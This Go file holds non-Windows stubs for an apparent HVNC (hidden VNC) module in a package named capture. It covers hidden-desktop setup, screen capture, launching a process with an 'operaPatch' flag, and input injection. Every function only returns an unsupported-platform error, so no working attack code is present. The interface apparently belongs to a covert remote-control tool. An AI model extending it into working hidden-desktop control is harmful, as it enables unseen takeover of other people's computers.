//go:build !windows

package capture

import (
	"errors"
	"image"
)

func InitializeHVNCDesktop() error {
	return errors.New("HVNC not supported on this platform")
}

func CleanupHVNCDesktop() {}

func SetHVNCCursorCapture(enabled bool) {}

func SetHVNCDXGIEnabled(enabled bool) {}

func GetHVNCDXGIEnabled() bool { return false }

func hvncCaptureDisplay(display int) (*image.RGBA, error) {
	return nil, errors.New("HVNC not supported on this platform")
}

func HVNCMonitorCount() int {
	return 0
}

func StartHVNCProcess(filePath string, operaPatch bool) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputMouseMove(display int, x, y int32) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputMouseDown(button int) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputMouseUp(button int) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputKeyDown(vk uint16) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputKeyUp(vk uint16) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCInputMouseWheel(delta int32) error {
	return errors.New("HVNC not supported on this platform")
}

func HVNCAutoStartExplorer() error {
	return errors.New("HVNC not supported on this platform")
}
